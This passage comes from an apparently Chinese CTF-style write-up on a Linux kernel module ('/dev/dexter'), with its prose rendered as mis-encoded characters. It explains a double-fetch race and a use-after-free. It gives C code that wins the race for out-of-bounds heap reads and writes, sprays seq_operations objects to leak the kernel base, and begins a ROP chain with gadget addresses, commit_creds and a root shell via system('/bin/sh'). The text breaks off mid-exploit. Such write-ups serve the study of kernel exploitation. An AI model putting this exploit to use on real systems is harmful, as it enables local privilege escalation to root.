class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>arg<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token keyword">switch</span> <span class="token punctuation">(</span>cmd<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">case</span> CMD_GET<span class="token operator">:</span> <span class="token keyword">return</span> <span class="token function">copy_data_to_user</span><span class="token punctuation">(</span>filp<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>arg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> CMD_SET<span class="token operator">:</span> <span class="token keyword">return</span> <span class="token function">copy_data_from_user</span><span class="token punctuation">(</span>filp<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>arg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">default</span><span class="token operator">:</span> <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬ä¼ å…¥çš„æ•°æ®éœ€è¦æ˜¯ request_t ç»“æ„ä½“ç±»å‹ï¼Œå¤§å°ä¸º0x10ï¼›åŒæ—¶åœ¨ioctlæ—¶ä¼šæ£€æŸ¥req.ptréç©ºä¸”req.len&lt;&#x3D;0x20ã€‚</p><p>åœ¨closeæ—¶æ²¡æœ‰æ¸…é™¤å †æŒ‡é’ˆï¼Œå­˜åœ¨UAF</p><h2 id="äºŒ-åˆ©ç”¨æ€è·¯"><a href="#äºŒ-åˆ©ç”¨æ€è·¯" class="headerlink" title="(äºŒ)åˆ©ç”¨æ€è·¯"></a>(äºŒ)åˆ©ç”¨æ€è·¯</h2><p>è€ƒè™‘è¿™æ ·ä¸€ç§æƒ…å†µï¼šå¦‚æœç”¨æˆ·ç©ºé—´è¿›ç¨‹é¦–å…ˆä¼ å…¥ä¸€ä¸ªå®Œå…¨åˆæ³•çš„request_tç»“æ„ä½“ï¼Œå…¶ä¸­çš„ptrå’Œlenéƒ½æ˜¯ç¬¦åˆä¸Šè¿°å†…æ ¸æ¨¡å—è¦æ±‚çš„ï¼Œå¾ˆæ˜¾ç„¶è¿™ä¸ªç»“æ„ä½“èƒ½å¤Ÿé€šè¿‡verify_requestçš„æ£€æŸ¥ã€‚ä½†å‡å¦‚åœ¨åˆšé€šè¿‡æ£€æŸ¥åå’Œæ¨¡å—çœŸæ­£è¿›è¡Œè¯»å†™æ“ä½œä¹‹å‰ï¼Œç”¨æˆ·ç©ºé—´è¿›ç¨‹ä¿®æ”¹äº†è¯¥ç»“æ„ä½“ä¸­çš„lenæˆå‘˜çš„å€¼ï¼Œæƒ…å†µä¼šæ€ä¹ˆæ ·å‘¢ï¼Ÿ</p><p>ç­”æ¡ˆæ˜¯ï¼Œä¸Šè¿°æ“ä½œå¯èƒ½é€ æˆå †è¶Šç•Œè¯»æˆ–è¶Šç•Œå†™ã€‚</p><h3 id="double-fetch"><a href="#double-fetch" class="headerlink" title="double fetch"></a>double fetch</h3><p><strong>Double Fetch</strong>æ˜¯å†…æ ¸ç©ºé—´ä¸­å‘ç”Ÿçš„ä¸€ç§æ•°æ®ç«äº‰ç±»å‹çš„åç§°ã€‚é¡¾åæ€ä¹‰ï¼Œæ˜¯æŒ‡åœ¨å†…æ ¸ç«¯ä¸¤æ¬¡å–ï¼ˆè¯»ï¼‰åŒä¸€ä¸ªæ•°æ®æ—¶å‘ç”Ÿçš„å†²çªã€‚  </p><p>å½“å†…æ ¸ç©ºé—´ä»ç”¨æˆ·ç©ºé—´è¯»å–ç›¸åŒçš„æ•°æ®ä¸¤æ¬¡æ—¶ï¼Œå¦ä¸€ä¸ªçº¿ç¨‹å¯èƒ½ä¼šé‡å†™ä¸­é—´çš„æ•°æ®ï¼šï¼ˆå›¾ç‰‡æ¥è‡ªè®ºæ–‡ï¼š<a href="https://www.usenix.org/conference/usenixsecurity17/technical-sessions/presentation/wang-pengfei">How Double-Fetch Situations turn into Double-Fetch Vulnerabilities: A Study of Double Fetches in the Linux Kernel | USENIX</a>ï¼‰<br><img src="/EXP_FILE/4fb5d1678f8d6ed206c514b6eee06482_MD5.jpeg"><br>æ­¤æ—¶ï¼Œç¬¬ä¸€æ¬¡å’Œç¬¬äºŒæ¬¡è¯»å–çš„æ•°æ®å†…å®¹ä¸åŒï¼Œå¯¼è‡´ä¸ä¸€è‡´ã€‚è¿™ç§æ•°æ®ç«äº‰ç§°ä¸ºåŒé‡è·å–</p><blockquote><p>åœ¨ç°ä»£Linuxæ“ä½œç³»ç»Ÿä¸­ï¼Œç”¨æˆ·ç©ºé—´ä¸å†…æ ¸ç©ºé—´çš„æ•°æ®äº¤æ¢éå¸¸é¢‘ç¹ã€‚ç®€å•çš„å˜é‡å¯ä»¥ç›´æ¥æŒ‰å€¼ä¼ é€’ï¼Œä½†æ˜¯ç³»ç»Ÿå¸¸å¸¸éœ€è¦ä»ç”¨æˆ·ç©ºé—´å‘å†…æ ¸ç©ºé—´ä¼ é€’å¤æ‚çš„æ•°æ®ç»“æ„ï¼Œå¹¶ä¸”éœ€è¦å…ˆå¯¹ä¼ å…¥çš„æ•°æ®è¿›è¡Œæ ¡éªŒå’Œé¢„å¤„ç†ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¸€å¼€å§‹è¢«ä¼ é€’çš„å¯èƒ½å¹¶ä¸æ˜¯æ•°æ®æœ¬èº«ï¼Œåªæ˜¯æŒ‡å‘ç»“æ„ä½“çš„æŒ‡é’ˆï¼Œå…·ä½“æ•°æ®ä»ç„¶å­˜åœ¨äºç”¨æˆ·ç©ºé—´ç•™å¾…åç»­å¤„ç†ã€‚å¦‚æœæ”»å‡»è€…åœ¨å†…æ ¸æ£€æŸ¥å’Œä½¿ç”¨æ•°æ®çš„è¿‡ç¨‹ä¹‹é—´æœ‰æœºä¼šæ”¹åŠ¨å¾…ä¼ å…¥æ•°æ®ï¼Œå°±å¯èƒ½ç»•è¿‡å†…æ ¸ä¸­çš„ç›¸åº”æ£€æŸ¥æœºåˆ¶ã€‚</p></blockquote><hr><p>ä½œè€…çš„pocï¼Œå°è¯•è§¦å‘double fetchï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> fd<span class="token punctuation">;</span><span class="token class-name">request_t</span> req<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">set</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> len<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  req<span class="token punctuation">.</span>ptr <span class="token operator">=</span> buf<span class="token punctuation">;</span>  req<span class="token punctuation">.</span>len <span class="token operator">=</span> len<span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CMD_SET<span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> len<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  req<span class="token punctuation">.</span>ptr <span class="token operator">=</span> buf<span class="token punctuation">;</span>  req<span class="token punctuation">.</span>len <span class="token operator">=</span> len<span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CMD_GET<span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> race_win <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">race</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>arg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>race_win<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    req<span class="token punctuation">.</span>len <span class="token operator">=</span> <span class="token number">0x100</span><span class="token punctuation">;</span>    <span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/dexter"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"/dev/dexter"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> zero<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token class-name">pthread_t</span> th<span class="token punctuation">;</span>  <span class="token function">pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>th<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> race<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>race_win<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">get</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">memcmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> zero<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      race_win <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">pthread_join</span><span class="token punctuation">(</span>th<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x100</span><span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%02x: 0x%016lx\n"</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨ä¸»çº¿ç¨‹ä¸­ï¼Œ<code>cmd_get</code>ä½¿ç”¨æ­£ç¡®çš„å¤§å°è¿›è¡Œè°ƒç”¨ï¼Œè€Œåœ¨å­çº¿ç¨‹ä¸­ï¼Œä¸æ–­å°†ç”¨æˆ·ç©ºé—´çš„å¤§å°ä¿¡æ¯é‡å†™ä¸ºéæ³•å€¼ã€‚å¦‚æœå­çº¿ç¨‹é‡å†™çš„æ—¶æœºåœ¨<code>verify_request</code>è°ƒç”¨å’Œ<code>copy_data_to_user</code>è°ƒç”¨ä¹‹é—´ï¼Œé‚£ä¹ˆæ•°æ®å°†ä»¥ä¸æ­£ç¡®çš„å¤§å°å¤åˆ¶ï¼Œä»è€Œé€ æˆå †ç¼“å†²åŒºæº¢å‡ºã€‚</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">overread</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> len<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>zero <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">pthread_t</span> th<span class="token punctuation">;</span>    <span class="token function">pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>th<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> race<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>zero<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>race_win<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">get</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">memcmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> zero<span class="token punctuation">,</span> len<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        race_win <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>      <span class="token function">pthread_join</span><span class="token punctuation">(</span>th<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    race_win <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>zero<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">overwrite</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> len<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">pthread_t</span> th<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>tmp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// å®šæ•°å›ã§raceã‚’è©¦ã¿ã‚‹  </span>    <span class="token function">pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>th<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> race<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x10000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token function">set</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      race_win <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token function">pthread_join</span><span class="token punctuation">(</span>th<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      race_win <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token comment">// ãƒ’ãƒ¼ãƒ—ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ãŒæˆåŠŸã—ã¦ã„ãªã‘ã‚Œã°å†è©¦è¡Œ  </span>    <span class="token function">overread</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">memcmp</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> len<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>      <span class="token function">free</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="seq-operations"><a href="#seq-operations" class="headerlink" title="seq_operations"></a>seq_operations</h3><p>æ¼æ´æ¨¡å—åˆ†é…çš„ç¼“å†²åŒºå¤§å°æ˜¯32å­—èŠ‚ï¼Œå› æ­¤å †å–·è¿‡ç¨‹éœ€è¦ä½¿ç”¨åŒæ ·ä¸ºkmalloc-32çš„å†…æ ¸å¯¹è±¡ã€‚æˆ‘ä»¬é€‰æ‹©<a href="https://elixir.bootlin.com/linux/v5.17.1/source/include/linux/seq_file.h#L32"><code>seq_operations</code>ç»“æ„ä½“</a>ï¼Œè¯¥ç»“æ„ä½“å¤§å°åˆšå¥½ä¸º32å­—èŠ‚ï¼ŒåŒ…å«4ä¸ªå‡½æ•°æŒ‡é’ˆï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">seq_operations</span> <span class="token punctuation">&#123;</span><span class="token keyword">void</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token operator">*</span>start<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">seq_file</span> <span class="token operator">*</span>m<span class="token punctuation">,</span> <span class="token class-name">loff_t</span> <span class="token operator">*</span>pos<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>stop<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">seq_file</span> <span class="token operator">*</span>m<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token operator">*</span>next<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">seq_file</span> <span class="token operator">*</span>m<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>v<span class="token punctuation">,</span> <span class="token class-name">loff_t</span> <span class="token operator">*</span>pos<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>show<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">seq_file</span> <span class="token operator">*</span>m<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç”¨æˆ·ç©ºé—´ä¸­æ‰“å¼€<code>/proc/self/stat</code>æ–‡ä»¶çš„æ“ä½œå¯ä»¥è§¦å‘å†…æ ¸ä¸­<code>seq_operations</code>çš„åˆ†é…ã€‚ç”±äºå®ƒ<br>åŒ…å«å‡½æ•°æŒ‡é’ˆï¼Œå› æ­¤å¯ä»¥æ³„æ¼å†…æ ¸çš„åœ°å€ï¼Œå¹¶ä¸”è¿˜å¯ä»¥é€šè¿‡è°ƒç”¨æ¥æ§åˆ¶RIP</p><h2 id="ä¸‰-EXP"><a href="#ä¸‰-EXP" class="headerlink" title="(ä¸‰)EXP"></a>(ä¸‰)EXP</h2><ol><li>é¦–å…ˆåœ¨å †å—å‘¨å›´å †å–·seq_operationsç»“æ„ä½“ï¼Œè§¦å‘double fetchä»è€Œè¶Šç•Œè¯»ï¼Œæ³„éœ²å†…æ ¸åŸºå€</li><li>æ²¡æœ‰å¼€å¯SMAPï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ç”¨æˆ·æ€å¸ƒç½®ropchainï¼Œå¯»æ‰¾åˆé€‚çš„gadgetæ¥è¿›è¡Œstack pivotingåˆ°ç”¨æˆ·æ€ã€‚</li></ol><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œé€‰æ‹©gadgetæ—¶rspéœ€è¦8å­—èŠ‚å¯¹é½ã€‚</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span> </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sched.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;pthread.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RDI_RET</span> <span class="token expression"><span class="token number">0xffffffff8109b0cd</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MOV_ESP_0x39000000_RET</span> <span class="token expression"><span class="token number">0xffffffff815b737f</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MOV_RDI_RAX_REP_MOVSQ_RET</span> <span class="token expression"><span class="token number">0xffffffff8163d0ab</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RCX_RET</span> <span class="token expression"><span class="token number">0xffffffff8110d88b</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token class-name">size_t</span> prepare_kernel_cred_addr<span class="token operator">=</span><span class="token number">0xffffffff810729b0</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> commit_creds<span class="token operator">=</span><span class="token number">0xffffffff81072810</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> swapgs_restore_regs_and_return_to_usermode<span class="token operator">=</span><span class="token number">0xffffffff81800e10</span><span class="token punctuation">;</span><span class="token comment">/*user_cs;user_rflags;user_sp;user_ss;*/</span><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span>user_ss<span class="token punctuation">,</span>user_rsp<span class="token punctuation">,</span>user_rflags<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"mov %0,cs;"</span><span class="token string">"mov %1,ss;"</span><span class="token string">"mov %2,rsp;"</span><span class="token string">"pushf;"</span><span class="token string">"pop %3;"</span>    <span class="token operator">:</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span> <span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Success to saveStatus!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] Error : %s\033[0m\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31;37m[*] &lt;Successfully Get Root Privileges>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] &lt;Get Root Error>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//</span><span class="token keyword">typedef</span> <span class="token 